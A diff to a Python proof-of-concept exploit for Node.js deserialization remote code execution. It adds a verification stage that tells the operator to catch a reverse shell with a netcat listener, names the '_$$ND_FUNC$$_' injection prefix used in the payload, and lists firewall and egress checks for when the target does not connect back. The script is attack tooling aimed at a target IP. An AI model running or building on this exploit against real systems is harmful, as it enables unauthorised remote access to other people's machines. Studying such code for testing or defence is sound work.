@@ -156,6 +156,25 @@ def stage_exploit(ctx: ExploitContext) -> bool:
         print(f"[-] Exploitation failed: {e}")
         return False
 
+
+def stage_verify(ctx: ExploitContext) -> bool:
+    """Stage 3: Verification guidance (Node child_process is often fire-and-forget)."""
+    print("\n[*] Stage 3: Verification")
+
+    if ctx.command_type == "ping":
+        print(f"[*] Verify with: ping listener or tcpdump -i any icmp")
+        print(f"[*] Or: nc -nlvp {ctx.attacker_port} (if you used reverse_shell)")
+        print("[!] Node exec is asynchronous — check your listener / callback server now.")
+        return True
+    else:
+        print(f"[*] Reverse shell should have been triggered.")
+        print(f"[*] If nothing connects, check:")
+        print("    - Firewall / egress on target")
+        print("    - Listener is running and reachable")
+        print("    - Payload used the exact _$$ND_FUNC$$_ prefix + IIFE ()")
+        return True
+
+
 def main():
     print("[+] Node.js Deserialization RCE PoC")
 
@@ -172,6 +191,8 @@ def main():
 
         if not stage_exploit(ctx):
             sys.exit(1)
+
+        stage_verify(ctx)
 
         print("\n[+] Exploitation completed")
         print(f"[!] Monitor for callbacks from {ctx.target_ip}")
